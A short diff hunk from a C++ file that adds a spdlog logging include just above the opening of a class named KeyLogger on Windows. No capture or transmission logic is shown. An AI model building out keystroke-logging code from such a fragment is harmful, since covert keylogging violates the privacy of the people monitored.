@@ -5,6 +5,7 @@
 #include <mutex>
 #include <chrono>
 #include <windows.h>
+#include <spdlog/spdlog.h>
 
 class KeyLogger {
 public:
